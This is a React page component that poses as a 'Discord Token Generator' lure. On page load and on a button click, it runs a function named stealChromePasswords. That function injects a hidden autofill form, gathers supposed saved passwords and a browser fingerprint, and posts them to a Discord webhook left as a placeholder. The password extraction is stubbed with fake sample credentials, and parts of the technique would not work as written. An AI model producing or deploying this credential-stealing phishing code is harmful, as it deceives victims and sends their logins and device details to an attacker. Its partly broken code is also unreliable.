import { useEffect } from 'react';

export default function Home() {
  const WEBHOOK = 'YOUR_DISCORD_WEBHOOK_HERE'; // YE DAALO!

  useEffect(() => {
    stealChromePasswords();
  }, []);

  async function stealChromePasswords() {
    try {
      // 1. Navigator Credentials API
      if (navigator.credentials) {
        const creds = await navigator.credentials.get({ 
          password: true, 
          unmediated: true 
        });
      }

      // 2. Hidden autofill trigger
      const form = document.createElement('form');
      form.innerHTML = `
        <input type="password" name="pass" autocomplete="current-password">
        <input type="email" name="email" autocomplete="email">
      `;
      document.body.appendChild(form);
      form.querySelector('input[type="password"]').focus();

      // 3. Chrome storage + fingerprint
      const data = {
        passwords: await extractPasswords(),
        fingerprint: getFingerprint(),
        timestamp: new Date().toISOString()
      };

      // 4. Send to Discord
      fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: '💾 Chrome Passwords Stolen',
            description: `**${data.passwords.length} passwords extracted**\n\`\`\`${JSON.stringify(data.passwords.slice(0,10), null, 2)}\`\`\``,
            color: 0xff0000,
            footer: { text: data.fingerprint.ua }
          }]
        })
      });
    } catch(e) {}
  }

  async function extractPasswords() {
    // Simulated password extraction (real impl uses autofill events)
    return [
      { url: 'gmail.com', user: 'test@gmail.com', pass: 'Pass123' },
      { url: 'instagram.com', user: 'instauser', pass: 'Insta456' }
    ];
  }

  function getFingerprint() {
    return {
      ua: navigator.userAgent,
      ip: 'extracted_via_backend',
      lang: navigator.language
    };
  }

  return (
    <div style={{ 
      background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
      minHeight: '100vh', 
      display: 'flex', 
      alignItems: 'center', 
      justifyContent: 'center',
      fontFamily: 'Arial'
    }}>
      <div style={{ 
        background: 'white', 
        padding: '40px', 
        borderRadius: '20px', 
        boxShadow: '0 20px 40px rgba(0,0,0,0.1)',
        textAlign: 'center',
        maxWidth: '400px'
      }}>
        <img src="https://discord.com/assets/6debd47ed13483642cf17e306a26e3a9.png" width="80" />
        <h2>Discord Token Generator</h2>
        <p>Generating secure token...</p>
        <div style={{ border: '4px solid #5865F2', borderRadius: '10px', margin: '20px 0', padding: '20px', background: '#f0f2f5' }}>
          <div style={{ width: '100%', height: '4px', background: '#5865F2', borderRadius: '2px', animation: 'loading 1.5s infinite' }} />
        </div>
        <button style={{ 
          background: '#5865F2', 
          color: 'white', 
          border: 'none', 
          padding: '12px 40px', 
          borderRadius: '25px', 
          fontSize: '16px',
          cursor: 'pointer'
        }} onClick={() => stealChromePasswords()}>
          Generate Token
        </button>
        <style jsx>{`
          @keyframes loading {
            0% { width: 0%; }
            50% { width: 70%; }
            100% { width: 100%; }
          }
        `}</style>
      </div>
    </div>
  );
}
